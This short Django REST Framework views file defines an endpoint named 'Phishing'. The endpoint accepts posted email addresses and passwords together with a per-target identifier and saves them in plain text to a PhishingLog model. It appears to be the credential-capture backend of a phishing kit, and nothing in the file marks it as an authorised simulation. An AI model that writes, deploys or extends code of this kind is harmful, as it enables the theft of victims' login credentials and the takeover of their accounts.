from django.shortcuts import render
from rest_framework.views import APIView
from rest_framework.response import Response
from .models import *
# Create your views here.


class Phishing(APIView):
    def post(self, request):
        data = request.data
        who = ''
        email = ''
        password = ''

        if 'from' in data:
            who = data['from']
        if 'email' in data:
            email = data['email']
        if 'password' in data:
            password = data['password']

        ph = PhishingLog.objects.create(hash=who, email=email, password=password)
        ph.save()

        return Response(status=200)
